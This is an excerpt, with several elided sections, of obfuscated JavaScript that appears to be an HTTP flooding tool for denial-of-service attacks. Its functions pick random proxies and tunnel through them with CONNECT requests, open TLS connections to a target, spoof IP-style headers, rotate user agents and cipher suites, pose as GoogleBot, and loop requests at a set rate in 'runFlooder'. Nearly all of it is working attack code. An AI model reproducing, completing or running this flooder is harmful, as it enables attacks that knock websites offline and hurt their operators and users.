...
function randomElement(_0x4705e0) {
  return _0x4705e0[randomIntn(0, _0x4705e0.length)]
}
function randstr(_0x4c0fff) {
  const _0x15f41c =
    'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
  let _0x40b83e = ''
  const _0x4f93f9 = _0x15f41c.length
  for (let _0x550974 = 0; _0x550974 < _0x4c0fff; _0x550974++) {
    _0x40b83e += _0x15f41c.charAt(Math.floor(Math.random() * _0x4f93f9))
  }
  return _0x40b83e
}
const ip_spoof = () => {
    ...
    return (
      _0x3a867f() + '.' + _0x3a867f() + '.' + _0x3a867f() + '.' + _0x3a867f()
    )
  },
  spoofed = ip_spoof(),
  ip_spoof2 = () => {
  ...
  ip_spoof1 = () => {
    const _0x3a7f81 = () => {
      return Math.floor(Math.random() * 5009000000000)
    }
    return '' + _0x3a7f81()
  },
  spoofed1 = ip_spoof1(),
...
var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))],
  ...
  az1 = useragentl[Math.floor(Math.floor(Math.random() * useragentl.length))],
  ...
  moz = mozilla[Math.floor(Math.floor(Math.random() * mozilla.length))],
...
class NetSocket {
  ...
  ['HTTP'](_0x18c6f3, _0x297215) {
    const _0x41c79a = _0x18c6f3.address.split(':'),
      _0x50d558 = _0x41c79a[0],
      _0x3b98cd =
        'CONNECT ' +
        _0x18c6f3.address +
        ':443 HTTP/1.1\r\nHost: ' +
      ...
      _0x3650fa = new Buffer.from(_0x3b98cd),
      _0x4a9aad = net.connect({
        host: _0x18c6f3.host,
        port: _0x18c6f3.port,
      })
    _0x4a9aad.setTimeout(_0x18c6f3.timeout * 100000)
    _0x4a9aad.setKeepAlive(true, 100000)
    _0x4a9aad.on('connect', () => {
      _0x4a9aad.write(_0x3650fa)
    })
    _0x4a9aad.on('data', (_0x4ab3a8) => {
      const _0x2f55a0 = _0x4ab3a8.toString('utf-8'),
        _0x1d0337 = _0x2f55a0.includes('HTTP/1.1 200')
      if (_0x1d0337 === false) {
        return (
          _0x4a9aad.destroy(),
          _0x297215(undefined, 'error: invalid response from proxy server')
        )
      }
    ...
    _0x4a9aad.on('timeout', () => {
      return (
        _0x4a9aad.destroy(), _0x297215(undefined, 'error: timeout exceeded')
      )
    })
    _0x4a9aad.on('error', (_0x4e0c18) => {
      return _0x4a9aad.destroy(), _0x297215(undefined, 'error: ' + _0x4e0c18)
    })
  }
}
...
headers['user-agent'] =
  moz + az1 + '-(GoogleBot + http://www.google.com)' + ' Code:' + randstr(7)
headers.referer = Ref
...
function runFlooder() {
  const _0x5f4a81 = randomElement(proxies),
    _0x29c53a = _0x5f4a81.split(':')
  ...
  Socker.HTTP(_0x2d8083, (_0x1ef375, _0x4422c4) => {
    ...
    _0x1ef375.setKeepAlive(true, 200000)
    const _0x2d7ad6 = {
        secure: true,
      ...
      _0xef3f9e = tls.connect(443, parsedTarget.host, _0x2d7ad6)
    _0xef3f9e.setKeepAlive(true, 60000)
    ...
    setInterval(() => {
      _0xf5acd4.on('connect', () => {
        ...
        for (let _0x38a2cc = 0; _0x38a2cc < args.Rate; _0x38a2cc++) {
